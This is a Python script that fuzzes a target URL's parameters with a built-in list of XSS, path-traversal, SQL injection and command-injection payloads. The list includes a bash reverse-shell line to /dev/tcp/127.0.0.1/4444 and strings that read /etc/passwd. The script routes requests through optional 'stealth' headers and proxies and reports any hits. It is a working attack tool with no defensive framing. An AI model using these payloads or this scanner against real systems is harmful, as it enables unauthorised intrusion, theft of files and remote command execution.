import requests
import random
import time
from urllib.parse import urlparse, parse_qs

# Advanced testing payloads
PAYLOADS = {
    "XSS": [
        "<svg/onload=alert(1)>",
        '"><img src=x onerror=confirm(document.domain)>',
        "javascript:alert(1)//",
        "[click me](javascript:alert('XSS'))",
        "'\"><script>alert(document.cookie)</script>"
    ],
    "LFI": [
        "../../../../../../etc/passwd",
        "..\\..\\..\\..\\..\\..\\windows\\win.ini",
        "../../../../../../var/log/apache2/access.log",
        "/etc/passwd%00",
        "C:\\Windows\\System32\\drivers\\etc\\hosts"
    ],
    "SQLi": [
        "' OR 1=1 --",
        "admin' #",
        "' UNION SELECT null, user(), database() --",
        "' UNION SELECT 1,2,3 --"
    ],
    "RCE": [
        "; ping -c 3 8.8.8.8 ;",
        "| whoami",
        "& whoami",
        "$(whoami)",
        "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"
    ]
}

def test_parameters(base_url, params, headers=None, proxies=None):
    found_vulns = []
    
    for param in params:
        for p_type, p_list in PAYLOADS.items():
            for payload in p_list:
                test_params = params.copy()
                test_params[param] = payload
                
                try:
                    # Use provided stealth headers and proxies
                    response = requests.get(base_url, params=test_params, timeout=5, headers=headers, proxies=proxies)
                    
                    # Reflection Check for XSS
                    if payload in response.text and p_type == "XSS":
                        vuln = {"type": "XSS", "param": param, "payload": payload, "url": response.url}
                        found_vulns.append(vuln)
                        print(f"VULN_DETECTED|TYPE:XSS|PARAM:{param}|PAYLOAD:{payload}|URL:{response.url}")
                    
                    # File Content Check for LFI
                    elif p_type == "LFI" and any(indicator in response.text for indicator in ["root:x:0:0", "[extensions]", "127.0.0.1 localhost"]):
                        vuln = {"type": "LFI", "param": param, "payload": payload, "url": response.url}
                        found_vulns.append(vuln)
                        print(f"VULN_DETECTED|TYPE:LFI|PARAM:{param}|PAYLOAD:{payload}|URL:{response.url}")

                    # Check for SQLi (Error based or Union based)
                    elif p_type == "SQLi":
                        sqli_indicators = [
                            "SQL syntax", "mysql_fetch", "ORA-00933", 
                            "PostgreSQL query failed", "SQLite3::query",
                            "user()", "database()", "root@localhost"
                        ]
                        if any(indicator.lower() in response.text.lower() for indicator in sqli_indicators):
                            vuln = {"type": "SQLi", "param": param, "payload": payload, "url": response.url}
                            found_vulns.append(vuln)
                            print(f"VULN_DETECTED|TYPE:SQLi|PARAM:{param}|PAYLOAD:{payload}|URL:{response.url}")
                    
                    # Check for RCE
                    elif p_type == "RCE":
                        rce_indicators = ["uid=", "groups=", "www-data", "root", "nt authority\\system"]
                        if any(indicator in response.text.lower() for indicator in rce_indicators):
                            vuln = {"type": "RCE", "param": param, "payload": payload, "url": response.url}
                            found_vulns.append(vuln)
                            print(f"VULN_DETECTED|TYPE:RCE|PARAM:{param}|PAYLOAD:{payload}|URL:{response.url}")

                except Exception as e:
                    continue
    return found_vulns
